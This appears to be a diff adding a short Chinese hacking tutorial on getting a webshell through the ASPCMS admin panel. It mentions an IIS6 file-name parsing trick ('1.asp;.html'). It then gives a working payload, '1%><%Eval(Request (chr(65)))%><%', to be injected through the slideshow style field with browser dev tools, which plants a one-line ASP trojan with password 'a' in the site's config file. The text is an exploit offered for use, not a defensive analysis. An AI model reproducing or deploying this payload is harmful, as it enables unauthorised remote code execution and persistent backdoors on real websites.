@@ -1,0 +1,9 @@
+aspcms在老版本中可以通过添加模板直接添加asp.但是新版的aspcms中已经限制了添加模板的格式为html,js,css,当然如果是遇到iis6的话还是可以通过iis6的解析漏洞把文件名改成1.asp;.html这样的格式来拿到shell的.可是如果遇到iis7.5呢?以下是本人自己找到挖掘到的aspcms通杀版本的后台拿shell方法.
+1、进入后台，“扩展功能”--“幻灯片设置”--”幻灯样式”
+
+
+
+2、使用chorme的审查元素功能或者firefox的firebug，总之使用能修改当前页面元素的工具就好了。将对应的slidestyle的value的值修改为1%><%Eval(Request (chr(65)))%><%
+
+
+3、一句话木马，密码a。在/config/AspCms_Config.asp
